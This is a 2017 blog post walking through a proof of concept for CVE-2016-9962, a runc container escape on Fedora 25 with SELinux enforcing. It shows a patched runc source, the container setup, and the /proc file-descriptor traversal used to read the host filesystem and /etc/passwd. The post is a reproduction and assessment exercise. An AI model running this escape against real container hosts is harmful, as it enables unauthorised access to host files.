+++
date = "2017-01-17T03:27:40+09:00"
title = "Docker vulnerability (CVE-2016-9962) PoC with SELinux"
draft = false
+++

Here we described how to reproduce CVE-2016-9962(vulnerability for Docker) and
how can we protect it by using SELinux.

  

* * *

## Reference

#### <https://bugzilla.redhat.com/show_bug.cgi?id=1409531>

#### <https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2>

## Prepare for PoC

Here is a description how to reproduce it. **I used Fedora25 for this PoC.**

This vulnerability is quite hard to reproduce because there's not so much race
window on runc. Also, we need to add "CAP_SYS_PTRACE" to container for
checking other container's status.

  1. Install docker, runc on your PC.
    
        [root@localhost ~]# rpm -qa|grep -i docker
    golang-github-fsouza-go-dockerclient-devel-0.2.1-17.git2350d7b.fc25.noarch
    golang-github-docker-go-unit-test-devel-1.5.1-0.3.gitd30aec9.fc25.x86_64
    golang-github-docker-go-devel-1.5.1-0.3.gitd30aec9.fc25.noarch
    docker-devel-1.12.6-3.git51ef5a8.fc25.noarch
    golang-github-docker-libcontainer-devel-2.1.1-0.8.gitc964368.fc25.noarch
    docker-1.12.6-4.gitf499e8b.fc25.x86_64
    golang-github-docker-libcontainer-2.1.1-0.8.gitc964368.fc25.x86_64
    golang-github-docker-go-connections-devel-0.1.2-0.2.git6e4c13d.fc25.noarch
    docker-common-1.12.6-4.gitf499e8b.fc25.x86_64
    golang-github-docker-go-connections-unit-test-devel-0.1.2-0.2.git6e4c13d.fc2
5.x86_64
    golang-github-docker-go-units-devel-0.2.0-3.fc25.noarch
    [root@localhost ~]# rpm -qa|grep -i runc
    runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64
    runc-devel-0.1.1-4.git57b9972.fc25.noarch
    

  2. Start docker.
    
        [root@localhost ~]# systemctl start docker
    

  3. Use "alpine" image for PoC.
    
        [root@localhost ~]# docker pull alpine
    

  4. create alpine image (named "alpine")
    
        [root@localhost ~]# docker create alpine --name alpine
    

  5. check new alpine container name by using "docker ps -a". In below situation
, "small_lumiere" is the name.
    
        [root@localhost ~]# docker ps -a
    [root@localhost ~]# docker ps -a
    CONTAINER ID        IMAGE               COMMAND             CREATED         
    STATUS              PORTS               NAMES
    965456106c88        alpine              "--name alpine"     6 hours ago     
    Created                                 small_lumiere
    

  6. create "rootfs" directory and copy all of alpine file under rootfs/
    
        [root@localhost ~]# mkdir rootfs
    [root@localhost ~]# docker export small_lumiere |tar xvfC - rootfs
    

  7. create config.json
    
        [root@localhost ~]# runc spec
    

  8. modify config.json for assign CAP_SYS_PTRACE capability.
    
                        "capabilities": [
                            "CAP_AUDIT_WRITE",
                            "CAP_KILL",
                            "CAP_SYS_PTRACE",
                            "CAP_NET_BIND_SERVICE"
                    ],
    

  9. For PoC, we will modify runc source. Get/install runc SRPM and modify sourc
e code.
    
        [root@localhost ~]# rpm -ivh /tmp/runc-1.0.0-3.rc2.gitc91b5be.fc25.src.r
pm
    [root@localhost ~]# cd SOURCES/
    [root@localhost ~]# ls
    runc-c91b5be.tar.gz
    [root@localhost ~]#
    [root@localhost ~]# mkdir ../work
    [root@localhost ~]# cd ../work/
    [root@localhost ~]# tar -xvzf ../SOURCES/runc-c91b5be.tar.gz
    [root@localhost ~]# cd runc-c91b5bea4830a57eac7882d7455d59518cdf70ec/
    [root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# ls
    CONTRIBUTING.md       VERSION        main.go              script
    Dockerfile            checkpoint.go  main_solaris.go      signals.go
    Godeps                contrib        main_unix.go         spec.go
    LICENSE               create.go      main_unsupported.go  start.go
    MAINTAINERS           delete.go      man                  state.go
    MAINTAINERS_GUIDE.md  events.go      pause.go             tests
    Makefile              exec.go        ps.go                tty.go
    NOTICE                kill.go        restore.go           update.go
    PRINCIPLES.md         libcontainer   rlimit_linux.go      utils.go
    README.md             list.go        run.go               utils_linux.go
    [root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# vi libcontai
ner/setns_init_linux.go 
    

  10. We add 2 lines ;
    
        [root@localhost libcontainer]# diff -Nru setns_init_linux.go setns_init_
linux.go.org 
    --- setns_init_linux.go	2017-01-16 15:26:01.067477093 +0900
    +++ setns_init_linux.go.org	2017-01-16 15:25:22.921553094 +0900
    @@ -5,6 +5,7 @@
     import (
     	"fmt"
     	"os"
    +	"time"
     
     	"github.com/opencontainers/runc/libcontainer/apparmor"
     	"github.com/opencontainers/runc/libcontainer/keys"
    @@ -49,5 +50,6 @@
     	if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {
     		return err
     	}
    +	time.Sleep(500 * time.Second)
     	return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())
     }
    

  11. make tar.gz and re-create runc package by using rpmbuild.
    
        [root@localhost work]# tar -cvfrunc-c91b5be.tar runc-c91b5bea4830a57eac7
882d7455d59518cdf70ec
    [root@localhost work]# gzip runc-c91b5be.tar
    [root@localhost work]# cp runc-c91b5be.tar.gz ../SOURCES
    [root@localhost work]# cd ../SPECS/
    [root@localhost SPECS]# rpmbuild -ba runc.spec
    [root@localhost SPECS]# cd ~
    

  12. uninstall and re-install modified runc package;
    
        [root@localhost ~]# rpm -e runc
    [root@localhost ~]# rpm -ivh rpmbuild/RPMS/x86_64/runc-1.0.0-3.rc2.gitc91b5b
e.fc25.x86_64.rpm
    

* * *

## PoC

  * open 2 terminals(shell1, shell2).

  * Check SELinux is enabled;
    
        [root@localhost ~]# getenforce
    Enforcing
    

  * run container(sh) in shell1;
    
        [root@localhost ~]# runc run ctr
    / # 
    

  * run new container in shell2 with "runc exec" command. It is pausing 500sec;
    
        [root@localhost ~]# runc run ctr
    
    

  * run "ps ax" in shell1. You can see shell2 process;
    
        [root@localhost ~]# runc run ctr
    / # ps ax
    PID   USER     TIME   COMMAND
        1 root       0:00 sh
        6 root       0:00 /proc/self/exe init
       11 root       0:00 ps ax
    / # 
    

  * In above case, check /proc/6/fd by ls command. You see path as fd/4;
    
        / # ls -la /proc/6/fd/
    total 0
    dr-x------    2 root     root             0 Jan 16 06:43 .
    dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
    lrwx------    1 root     root            64 Jan 16 06:43 0 -> /dev/pts/4
    lrwx------    1 root     root            64 Jan 16 06:43 1 -> /dev/pts/4
    lrwx------    1 root     root            64 Jan 16 06:43 2 -> /dev/pts/4
    lrwx------    1 root     root            64 Jan 16 06:43 3 -> socket:[40487]
    lr-x------    1 root     root            64 Jan 16 06:43 4 -> /run/runc/ctr
    lrwx------    1 root     root            64 Jan 16 06:43 5 -> /dev/pts/4
    lr-x------    1 root     root            64 Jan 16 06:43 6 -> pipe:[40496]
    l-wx------    1 root     root            64 Jan 16 06:43 7 -> /dev/null
    / # 
    

  * Check "/proc/6/fd/4/../../.." by ls command. You can see parent(host) / file
system;
    
        / # ls -l /proc/6/fd/4/../../..
    total 64
    lrwxrwxrwx    1 root     root             7 Feb  3  2016 bin -> usr/bin
    dr-xr-xr-x    6 root     root          4096 Jan 16 00:07 boot
    drwxr-xr-x   19 root     root          3840 Jan 16 05:57 dev
    drwxr-xr-x  130 root     root         12288 Jan 16 05:40 etc
    drwxr-xr-x    3 root     root          4096 Oct 12 22:55 home
    
    

  * You can also read /etc/passwd by using "cat /proc/6/fd/4/../../../etc";
    
        / # cat /proc/6/fd/4/../../../etc/passwd
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    

* * *

## Conclusion

Now we could see that CVE-2016-9962 PoC is successfull even if SELinux is
enforcing. But we think this vulnerability is not critical because;

  * The race window is quite narrow(then we needed to modify runc source.)

  * We also need to add "CAP_SYS_PTRACE" on the container(it is removed in defau
lt.)

